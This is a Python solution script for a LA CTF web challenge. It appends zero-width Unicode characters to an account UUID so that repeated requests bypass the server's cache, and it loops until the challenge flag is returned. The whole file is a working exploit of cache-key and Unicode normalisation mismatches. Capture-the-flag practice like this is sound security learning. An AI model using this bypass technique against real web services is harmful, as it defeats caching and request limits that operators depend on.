#!/usr/bin/env python3
import requests
import time
import re

# Define a zero-width character alphabet:
# U+200B (zero width space), U+200C (zero width non-joiner), U+200D (zero width joiner)
ZW_ALPHABET = ["\u200B", "\u200C", "\u200D"]

def encode_zero_width(n):
    """
    Encodes the number n into a string using zero-width characters based on the length of ZW_ALPHABET.
    Returns a unique string for each n (n=0 returns an empty string).
    """
    if n == 0:
        return ""
    result = ""
    base = len(ZW_ALPHABET)
    while n > 0:
        result = ZW_ALPHABET[n % base] + result
        n //= base
    return result

def get_account_uuid(session, base_url):
    """
    Visits the homepage to get the account and the cookie with the UUID.
    """
    r = session.get(f"{base_url}/")
    if r.status_code != 200:
        raise Exception("Error accessing the homepage!")
    user_uuid = session.cookies.get("id")
    if not user_uuid:
        raise Exception("UUID not found in cookies!")
    return user_uuid

def get_wins(response_text):
    """
    Extracts the number of wins from the response.
    Example: if the response says "Only 87 more wins to go."
    then wins = 100 - 87 = 13.
    """
    m = re.search(r"Only (\d+) more wins", response_text)
    if m:
        remaining = int(m.group(1))
        return 100 - remaining
    return None

def exploit():
    base_url = "https://cache-it-to-win-it.chall.lac.tf/" 
    session = requests.Session()
    
    # 1. Get the UUID from the homepage (cookie is also set)
    user_uuid = get_account_uuid(session, base_url)
    wins = 0
    attempt_counter = 0  # used to generate unique variants

    while wins < 100:
        # Generate a unique variant by encoding attempt_counter with zero-width characters
        variant_suffix = encode_zero_width(attempt_counter)
        # Build the modified parameter: the original UUID + the unique variant
        variant = user_uuid + variant_suffix
        r = session.get(f"{base_url}/check", params={"uuid": variant})
        
        # If the DB doesn't recognize the parameter, print a message and move to the next attempt
        if "Invalid account ID" in r.text:
            #print(f"[-] Invalid variant for attempt {attempt_counter}: {repr(variant)}")
            attempt_counter += 1
            continue
        
        # If we find the flag, exit
        if "FLAG" in r.text:
            #print("[+] FLAG obtained!")
            print("\nFLAG: " + re.search(r"lactf\{[^}]+\}", r.text).group(0))
            return
        
        new_wins = get_wins(r.text)
        if new_wins is not None and new_wins > wins:
            wins = new_wins
            #print(f"[+] Wins updated: {wins} (attempt {attempt_counter})")
        else:
            #print(f"[*] No increment (cache hit) for attempt {attempt_counter}")
            pass
        
        attempt_counter += 1
        time.sleep(0.3)
    
    #print("[+] Exploit completed!")

if __name__ == "__main__":
    exploit()
